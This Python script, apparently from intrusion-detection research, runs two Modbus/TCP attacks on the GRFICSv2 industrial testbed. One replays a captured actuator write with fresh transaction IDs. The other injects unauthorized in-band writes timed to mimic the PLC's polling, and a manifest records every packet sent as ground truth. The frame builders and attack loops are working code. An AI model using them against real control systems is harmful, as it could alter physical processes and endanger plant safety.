"""
Harder attacks against the GRFICSv2 plant, run from the sensor host.

The two attacks from attacks/txid_replay.py and attacks/mimic_injection.py,
rebuilt for a real remote-IO device (the first GRFICS run used the simple
attacks of tools/grfics_attack.py):

  * txid replay      - one FC16 write to the actuator register is captured and
    re-sent with fresh, incrementing transaction IDs (the PLC's own IDs
    increment, so a reused ID is not what gives it away).
  * mimic injection  - the PLC polls each IO device about every 50 ms with an
    FC4 read of the actuator register followed 1-5 ms later by an FC16 write.
    This attack copies that rhythm on its own connection: cover reads, with a
    few unauthorized FC16 writes 1-5 ms after a read, values drawn from the
    band the PLC really writes (the training data's 25th to 75th percentile).
    Content, register and timing all look routine; only the sender is wrong.

Origin is the sensor's own plant address (a separate host). A spoofed origin
(the PLC's address) is not run: the real PLC owns that address on the shared
segment, so replies would be unreliable, and that case is covered by the
Python testbed experiments.

Ground truth is a manifest of the exact bytes sent, written next to the
capture (matched by exact bytes plus source IP when labeling), as in the
Python testbed's per-packet logs.

Run ON the sensor (needs an IP on the plant network):
    sudo ip addr add 192.168.95.50/24 dev eth1
    python3 tools/grfics_harder_attack.py 192.168.95.11 manifest.json [seed|-] [paced]
"""

from __future__ import annotations

import json
import random
import socket
import struct
import sys
import time

PLC_PORT = 502
UNIT = 247
ACTUATOR_ADDR = 1
BAND = (300, 911)          # 25th-75th percentile of the PLC's normal writes


def fc16(tid: int, address: int, values: list[int]) -> bytes:
    body = b"".join(struct.pack(">H", v) for v in values)
    pdu = struct.pack(">BHHB", 0x10, address, len(values), len(body)) + body
    return struct.pack(">HHHB", tid & 0xFFFF, 0, len(pdu) + 1, UNIT) + pdu


def fc4(tid: int, address: int, count: int) -> bytes:
    pdu = struct.pack(">BHH", 0x04, address, count)
    return struct.pack(">HHHB", tid & 0xFFFF, 0, len(pdu) + 1, UNIT) + pdu


def send(sock, frame, kind, log, describe=""):
    log.append({"kind": kind, "raw_hex": frame.hex(), "sent_at": time.time(),
                "describe": describe})
    sock.sendall(frame)
    try:
        sock.settimeout(1.0)
        sock.recv(256)
    except OSError:
        pass


def txid_replay(target, rng, log, paced=False):
    """paced=False resends every 0.3 s. paced=True copies the PLC's rhythm
    instead: a cover read, then the write 1-5 ms later, about every 50 ms."""
    s = socket.create_connection((target, PLC_PORT))
    value = rng.randrange(*BAND)
    base = rng.randrange(1000, 60000)
    send(s, fc16(base, ACTUATOR_ADDR, [value]), "seed", log, f"captured write {value}")
    tid = base + 1
    for i in range(10):
        if paced:
            send(s, fc4(tid, ACTUATOR_ADDR, 2), "cover", log, "cover read")
            tid += 1
            time.sleep(rng.uniform(0.001, 0.005))
        else:
            time.sleep(0.3)
        send(s, fc16(tid, ACTUATOR_ADDR, [value]), "replay", log,
             f"resend write {value} with fresh txid")
        tid += 1
        if paced:
            time.sleep(max(0.01, 0.045 + rng.uniform(-0.01, 0.01)))
    s.close()


def mimic_injection(target, rng, log):
    s = socket.create_connection((target, PLC_PORT))
    tid = rng.randrange(1000, 60000)
    cycles = 60
    due = set(rng.sample(range(5, cycles), 5))
    for i in range(cycles):
        send(s, fc4(tid, ACTUATOR_ADDR, 2), "cover", log, "cover read")
        tid += 1
        if i in due:
            time.sleep(rng.uniform(0.001, 0.005))
            v = rng.randrange(*BAND)
            send(s, fc16(tid, ACTUATOR_ADDR, [v]), "attack", log,
                 f"in-band write {v} after read")
            tid += 1
        time.sleep(max(0.01, 0.045 + rng.uniform(-0.01, 0.01)))
    s.close()


def main() -> None:
    target, manifest = sys.argv[1], sys.argv[2]
    seed = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3] != "-" else random.SystemRandom().randrange(2**31)
    paced = len(sys.argv) > 4 and sys.argv[4] == "paced"
    rng = random.Random(seed)
    order = ["replay", "injection"]
    rng.shuffle(order)
    log: list[dict] = []
    print(f"seed {seed}, order {order}", flush=True)
    for name in order:
        if name == "replay":
            txid_replay(target, rng, log, paced)
        else:
            mimic_injection(target, rng, log)
        time.sleep(2.0)
    with open(manifest, "w") as f:
        json.dump({"seed": seed, "order": order, "paced_replay": paced, "packets": log}, f)
    print(f"done: {sum(p['kind'] == 'attack' for p in log)} injections, "
          f"{sum(p['kind'] == 'replay' for p in log)} replays", flush=True)


if __name__ == "__main__":
    main()
